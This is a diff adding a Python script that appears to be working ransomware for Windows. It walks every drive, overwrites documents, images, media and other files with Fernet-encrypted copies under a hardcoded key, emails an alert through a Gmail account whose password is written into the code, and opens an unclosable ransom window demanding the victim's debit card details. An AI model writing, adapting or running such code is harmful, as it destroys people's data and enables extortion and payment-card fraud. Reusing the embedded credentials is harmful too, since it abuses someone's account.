@@ -1,0 +1,117 @@
+from cryptography.fernet import Fernet
+import os
+from pathlib import Path
+import smtplib
+from email.message import EmailMessage
+import subprocess
+import tkinter
+from tkinter import *
+import ctypes
+
+# key generation
+key = '0knF7nE-13XK-Q8f5BheoSwTKG4E_D4CK_A2NrkeoQ8='
+# using the generated key
+fernet = Fernet(key)
+cwdir = os.getcwd()
+def get_logical_drives():
+    drive_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+    drives = []
+    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+        if drive_bitmask & 1:
+            drives.append(letter)
+        drive_bitmask >>= 1
+    return drives
+
+drives = get_logical_drives()
+
+for drive in drives:
+    driver = drive + ":\\"
+    input_dir = Path.cwd() / driver
+    txtfiles = list(input_dir.rglob("*.txt*"))
+    docxfiles = list(input_dir.rglob("*.docx*"))
+    xlsxfiles = list(input_dir.rglob("*.xlsx*"))
+    pngfiles = list(input_dir.rglob("*.png*"))
+    jpgfiles = list(input_dir.rglob("*.jpg*"))
+    jsonfiles = list(input_dir.rglob("*.json*"))
+    csvfiles = list(input_dir.rglob("*.csv*"))
+    xmlfiles = list(input_dir.rglob("*.xml*"))
+    mp3files = list(input_dir.rglob("*.mp3*"))
+    mp4files = list(input_dir.rglob("*.mp4"))
+    movfiles = list(input_dir.rglob("*.mov*"))
+    batfiles = list(input_dir.rglob("*.bat*"))
+    wavfiles = list(input_dir.rglob("*.wav*"))
+    pdffiles = list(input_dir.rglob("*.pdf*"))
+    pptxfiles = list(input_dir.rglob("*.pptx*"))
+    pptfiles = list(input_dir.rglob("*.ppt*"))
+
+    gfiles = txtfiles + docxfiles + xlsxfiles + pngfiles + jpgfiles + jsonfiles + csvfiles + xmlfiles + mp3files + mp4files + movfiles + batfiles + pdffiles + wavfiles + pptxfiles + pptfiles
+
+    count = 0
+
+    for singlefile in gfiles:
+        try:
+            # opening the original file to encrypt
+            with open(singlefile, 'rb') as file:
+                original = file.read()
+            # encrypting the file
+            encrypted = fernet.encrypt(original)
+            # opening the file in write mode and
+            # writing the encrypted data
+            with open(singlefile, 'wb') as encrypted_file:
+                encrypted_file.write(encrypted)
+        except:
+            pass
+        count += 1
+        print(f'{count} of {len(gfiles)} in drive {drive} encrypted')
+        print(singlefile)
+
+def email_alert(subject, body, to, fromwho):
+    msg = EmailMessage()
+    msg.set_content(body)
+    msg['subject'] = subject
+    msg['to'] = to
+
+    user = "anonymousishere521@gmail.com"
+    msg['from'] = fromwho
+    password = "vwabmiotfupfihdl"
+
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(user, password)
+    server.send_message(msg)
+
+    server.quit()
+try:
+    dydir = cwdir + '\\malwaredecryptorFY.exe'
+    subprocess.Popen(dydir)
+except:
+    pass
+
+if __name__ == '__main__':
+    email_alert("Alert", "Someone has triggered the not a ransomware and all files have been encrypted.", "ayaanstar521@gmail.com", 'ransomeware activated')
+    root =Tk()
+    frame = Frame(root)
+    frame.pack()
+    root.configure(background = 'Black')
+    root.geometry('500x450')
+    frame = Frame(root)
+    frame.pack()
+    msg = Message(frame, text="ATTENTION! READ CAREFULLY! ALL FILES ON THIS PC HAVE BEEN ENCRYPTED USING A COMPLEX AND UNBREAKBLE HASH, AND THE ORIGINAL FILES HAVE BEEN DELETED. ONLY WE HAVE EXCLUSIVE ACCESS TO YOUR FILES AS WELL AS ACCESS TO THE DECRYPTION KEY WHICH IS TO BE INSERTED IN THE DECRYPTION SOFTWARE WHICH IS STORED ON"
+                              "THE 'TAKEDOWN' FOLDER, TO RETURN YOUR FILES SAFELY BACK TO YOU. TO RETRIEVE YOUR FILES, SEND AN EMAIL TO xyz123@gmail.com WITH YOUR DEBIT CARD DETAILS AND WE WILL REPLY WITH THE DECRYPTION KEY", width=500, justify='left')
+    msg.config(bg='White',relief=RIDGE, font=('times', 20), pady=-2, borderwidth=1)
+    msg.pack(fill=BOTH)
+
+    def close_program():
+        root.destroy()
+
+    def disable_event():
+        pass
+
+    #btn = tkinter.Button(root, text = "Click me to close", command = close_program)
+    #btn.pack()
+
+    root.protocol("WM_DELETE_WINDOW", disable_event)
+
+    root.mainloop()
+
+
